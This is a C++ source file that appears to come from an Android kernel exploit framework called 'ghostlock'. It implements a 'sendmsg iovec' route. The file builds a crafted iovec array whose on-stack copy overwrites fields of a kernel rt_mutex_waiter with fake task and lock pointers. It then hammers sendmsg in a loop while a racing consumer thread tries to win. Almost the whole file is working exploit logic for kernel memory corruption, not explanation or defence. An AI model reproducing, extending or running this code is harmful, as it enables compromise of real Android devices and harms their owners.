#include "route/sendmsg_iovec_route.h"

#include <cerrno>
#include <ctime>
#include <unistd.h>

#include <array>
#include <utility>

using namespace ghostlock;

namespace ghostlock::route::sendmsg_iovec {
    SendmsgIovecRoute::SendmsgIovecRoute(
        race::PiRace *race_context, const memory::WriteRequest *route_request,
        const profile::TargetProfile &profile_value) noexcept
        : race(race_context), request(route_request), profile(profile_value) {
        status.code = ROUTE_RETRYABLE;
    }

    SendmsgIovecRoute::SendmsgIovecRoute(SendmsgIovecRoute &&other) noexcept
        : race(other.race),
          request(other.request),
          profile(other.profile),
          sock_read(std::move(other.sock_read)),
          sock_write(std::move(other.sock_write)),
          consumer_stuck(other.consumer_stuck),
          calls(other.calls),
          successes(other.successes),
          stamps(other.stamps),
          send_result(other.send_result),
          send_errno(other.send_errno),
          status(other.status) {
    }

    int32_t SendmsgIovecRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void SendmsgIovecRoute::disarm() noexcept {
        race->consumer_go.store(0);
        if (race->consumer_inflight.load() != 0) {
            for (int32_t i = 0;
                 i < 2000 && race->consumer_inflight.load() != 0;
                 i++) {
                usleep(1000);
            }
            consumer_stuck = race->consumer_inflight.load() != 0;
        }
        status.kernel_disarmed = !consumer_stuck;
    }

    void SendmsgIovecRoute::destroy() noexcept {
        if (consumer_stuck) {
            (void) fail(45, send_errno);
            status.code = ROUTE_DIRTY_FAILURE;
            /* A stuck consumer may still walk the stamped waiter; the socketpair
             * carries no kernel reference to it, so only the descriptors are
             * retained for the process lifetime. */
            (void) sock_read.release_to_process_lifetime("sendmsg consumer stuck");
            (void) sock_write.release_to_process_lifetime("sendmsg consumer stuck");
            return;
        }
        sock_read.reset();
        sock_write.reset();
        status.userspace_clean = 1;
        if (status.code != ROUTE_OK && status.kernel_disarmed) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
    }
} // namespace ghostlock::route::sendmsg_iovec

#if defined(__ANDROID__)
#include "common.h"

#include <sys/socket.h>

#include "route/route_lifecycle.hpp"
#include "session/exploit_session.hpp"
#include "support/time.h"

namespace ghostlock::route::sendmsg_iovec {
    namespace {
        /* rt_mutex_waiter words reachable through the on-stack iovec array. The
         * values mirror the 6.6 select_stack waiter table for the same fields
         * (tree/pi_tree stay untouched here because the buffer cannot reach
         * them). */
        inline constexpr size_t kSendmsgWakerState = 3;

        std::array<iovec, kSendmsgFastIovCount> build_waiter_iovecs(
            const memory::PayloadPage &page) noexcept {
            std::array<iovec, kSendmsgFastIovCount> iov{};
            /* iov[0]: base -> pi_tree.deadline (0), len -> waiter->task. The
             * base stays NULL on purpose: import_iovec never validates iovec
             * bases and the send data copy fails with EFAULT afterwards, once
             * the waiter words are already stamped. */
            iov[0].iov_base = nullptr;
            iov[0].iov_len = static_cast<size_t>(page.fake_task);
            /* iov[1]: base -> waiter->lock, len -> waiter->wake_state (low 32
             * bits of the iov_len slot). */
            iov[1].iov_base = reinterpret_cast<void *>(page.fake_lock);
            iov[1].iov_len = kSendmsgWakerState;
            /* iov[2]: base -> waiter->ww_ctx (NULL). iov[3..7] stay zero, which
             * only rewrites the dead tail above the waiter. */
            return iov;
        }
    } // namespace

    int32_t SendmsgIovecRoute::prepare() noexcept {
        const memory::PayloadPage &page = session::g_exploit_session.heap.current;
        if (!page.base || !page.fake_lock || !page.fake_fops || !page.fake_task) {
            pr_warning("sendmsg route missing kernel page base=%016zx lock=%016zx "
                       "fops=%016zx task=%016zx\n",
                       static_cast<size_t>(page.base),
                       static_cast<size_t>(page.fake_lock),
                       static_cast<size_t>(page.fake_fops),
                       static_cast<size_t>(page.fake_task));
            return fail(40, 0);
        }
        /* A socket fd is required: __sys_sendmsg resolves the fd before it
         * touches the iovec array. */
        int32_t fds[2];
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, fds) != 0) {
            return fail(41, errno);
        }
        sock_read.reset(fds[0]);
        sock_write.reset(fds[1]);
        return 0;
    }

    route::RouteStatus SendmsgIovecRoute::execute() noexcept {
        struct timespec route_t0;
        clock_gettime(CLOCK_MONOTONIC, &route_t0);

        const memory::PayloadPage &page = session::g_exploit_session.heap.current;
        std::array<iovec, kSendmsgFastIovCount> iov = build_waiter_iovecs(page);
        struct msghdr msg{};
        msg.msg_name = nullptr;
        msg.msg_namelen = 0;
        msg.msg_iov = iov.data();
        msg.msg_iovlen = static_cast<size_t>(kSendmsgFastIovCount);

        race->consumer_calls.store(0);
        race->consumer_success.store(0);
        race->consumer_stop.store(0);
        const uint32_t delay_usec = profile.select_enter_delay_us();
        const uint32_t timeout_ms = profile.select_timeout_us() / 1000u;
        const int32_t max_calls =
            static_cast<int32_t>(profile.select_consumer_max_calls());
        race->route_delay_usec.store(delay_usec);
        race->consumer_go.store(1);

        pr_info("sendmsg pre-stamp task=%016zx lock=%016zx delay_us=%u "
                "timeout_ms=%u max_calls=%d\n",
                static_cast<size_t>(page.fake_task),
                static_cast<size_t>(page.fake_lock), delay_usec, timeout_ms,
                max_calls);

        bool done = false;
        while (!done && stamps < static_cast<int32_t>(kSendmsgMaxStamps)) {
            errno = 0;
            const long sent = sendmsg(sock_write.get(), &msg, 0);
            if (stamps == 0) {
                send_result = static_cast<int32_t>(sent);
                send_errno = errno;
            }
            stamps++;

            if (race->consumer_success.load() > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
                done = true;
            } else if (max_calls > 0 && race->consumer_calls.load() >= max_calls) {
                (void) fail(42, send_errno);
                done = true;
            } else if (timeout_ms > 0 &&
                       runtime_time::runtime_elapsed_ms(&route_t0) >=
                           static_cast<double>(timeout_ms)) {
                (void) fail(43, ETIMEDOUT);
                done = true;
            }
        }
        if (!done) (void) fail(44, 0);
        race->consumer_go.store(0);
        calls = race->consumer_calls.load();
        successes = race->consumer_success.load();

        pr_info("sendmsg post-stamp ret=%d errno=%d stamps=%d calls=%d success=%d "
                "+%.0fms\n",
                send_result, send_errno, stamps, calls, successes,
                runtime_time::runtime_elapsed_ms(&route_t0));
        return status;
    }
} // namespace ghostlock::route::sendmsg_iovec

namespace ghostlock::route {
    route::RouteStatus do_sendmsg_iovec_fake_lock_route(
        const memory::WriteRequest *request) {
        sendmsg_iovec::SendmsgIovecRoute context(
            &session::g_exploit_session.race, request, session::g_exploit_session.profile);
        const route::RouteStatus status = run_route_lifecycle(context);
        if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 45) {
            pr_error("sendmsg consumer still inflight; leaking route fds\n");
        }

        pr_info("sendmsg route done calls=%d success=%d stamps=%d status=%d "
                "clean=%d/%d step=%d errno=%d\n",
                context.calls, context.successes, context.stamps,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number);
        return status;
    }
} // namespace ghostlock::route
#endif // __ANDROID__
